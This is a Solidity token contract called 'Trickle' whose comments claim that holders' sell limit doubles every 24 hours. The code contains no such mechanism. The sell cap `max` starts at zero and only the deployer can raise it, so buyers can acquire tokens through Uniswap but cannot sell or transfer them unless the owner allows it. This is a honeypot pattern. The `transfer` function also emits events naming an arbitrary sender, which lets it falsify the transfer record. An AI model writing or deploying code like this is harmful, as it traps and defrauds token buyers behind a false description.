pragma solidity ^0.6.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Trickle token is designed to stop people from dumping their entire bags as soon as price jumps, which should create a steady rise in price over time.
// The number of Trickle tokens that a person can sell on uniswap per transaction will double every 24 hours
// Website and socials coming soon
// Roadmap, token launch, website and socials, airdrop of new token to top 50 Trickle holders 

contract Trickle is IERC20 {
    
    using SafeMath for uint256;

    string public _name;
    string public _symbol;
    uint8 public _decimals;  
    uint256 _totalSupply;
    address private _boss;
    uint public max;
    address public UNIpair;
    
    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;   //uniswap factory addfress
    address token1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    //wETH contract with checksum
    address token0 = 0xAFE06F72247634E8a65ccb2c3aF3bde08eF8a97f;    //token contract with checksum, must know deployment address prior to deployment for this

    
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;

    constructor(string memory name, string memory symbol, uint8 decimals, uint256 total) public {  
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
	_totalSupply = total;
	balances[msg.sender] = _totalSupply;
	_boss = msg.sender;
	
	UNIpair = address(uint(keccak256(abi.encodePacked(
    hex'ff',
    factory,
     keccak256(abi.encodePacked(token0, token1)),
     hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' 
    ))));
    }  

    function changeMax(uint256 _max) public {
        require(msg.sender == _boss);
        max = _max;
    }


    function totalSupply() public override view returns (uint256) {
	return _totalSupply;
    }
    
    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transfer(address from, address to, uint256 numTokens) public override returns (bool) {
        if (from == _boss || to == _boss || from == UNIpair) {
            require(numTokens <= balances[msg.sender]);
            balances[msg.sender] = balances[msg.sender].sub(numTokens);
             balances[to] = balances[to].add(numTokens);
             emit Transfer(from, to, numTokens);
             return true;
        }
        
        else {
            require(numTokens <= balances[msg.sender]);
            require(numTokens <= max);
            balances[msg.sender] = balances[msg.sender].sub(numTokens);
            balances[to] = balances[to].add(numTokens);
            emit Transfer(from, to, numTokens);
            return true; 
        }
    }

    function transferFrom(address from, address to, uint256 numTokens) public override returns (bool) {
        if (from == _boss || to == _boss || from == UNIpair) {
            require(numTokens <= balances[from]);    
            require(numTokens <= allowed[from][msg.sender]);
    
            balances[from] = balances[from].sub(numTokens);
            allowed[from][msg.sender] = allowed[from][msg.sender].sub(numTokens);
            balances[to] = balances[to].add(numTokens);
            emit Transfer(from, to, numTokens);
            return true;
        }
        
        else {
            require(numTokens <= balances[from]);    
            require(numTokens <= allowed[from][msg.sender]);
            require(numTokens <= max);
            
            balances[from] = balances[from].sub(numTokens);
            allowed[from][msg.sender] = allowed[from][msg.sender].sub(numTokens);
            balances[to] = balances[to].add(numTokens);
            emit Transfer(from, to, numTokens);
            return true;
        }
    }
}

library SafeMath { 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
        return 0;
      }
      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");
      return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}